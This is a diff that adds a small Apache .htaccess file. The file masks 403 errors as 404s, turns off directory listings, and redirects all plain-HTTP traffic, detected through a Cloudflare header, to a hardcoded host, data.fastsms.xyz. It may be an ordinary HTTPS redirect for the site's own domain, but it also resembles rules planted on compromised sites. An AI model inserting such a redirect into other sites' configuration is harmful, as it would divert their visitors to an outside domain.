@@ -1,0 +1,6 @@
+ErrorDocument 404 /404.php
+ErrorDocument 403 /404.php
+RewriteEngine On
+RewriteCond %{HTTP:CF-Visitor} '"scheme":"http"'
+RewriteRule ^(.*)$ https://data.fastsms.xyz/$1 [L]
+Options -Indexes
